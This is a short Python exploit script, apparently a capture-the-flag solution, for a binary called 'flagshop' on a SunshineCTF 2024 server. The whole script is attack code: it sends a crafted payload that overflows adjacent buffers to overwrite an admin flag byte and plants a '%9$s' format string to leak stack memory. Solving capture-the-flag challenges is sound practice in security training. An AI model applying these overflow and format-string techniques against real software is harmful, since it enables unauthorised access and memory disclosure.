from gdb_plus import *

dbg = Debugger('./flagshop', script='init-gef').remote('2024.sunshinectf.games', 24001)

io = dbg.p

dbg.c(wait=False)

io.sendlineafter(b'username ]', b'foo')
io.sendlineafter(b'pronouns ]', b'bar')

payload = b'1'
payload += b'X' # padding (1 additional byte of the `choice` buffer)
payload += b'A' * 8 # pronouns (8 bytes)
username = b'%9$s' # format string to print the 9th argument (or 3rd stack argument) as a string
payload += username
payload += b'B' * (16 - len(username)) # username (16 bytes)
payload += b'*' # 1st byte of admin flag

io.sendlineafter(b'==========================================\n', payload)

log.info(io.recvall().decode())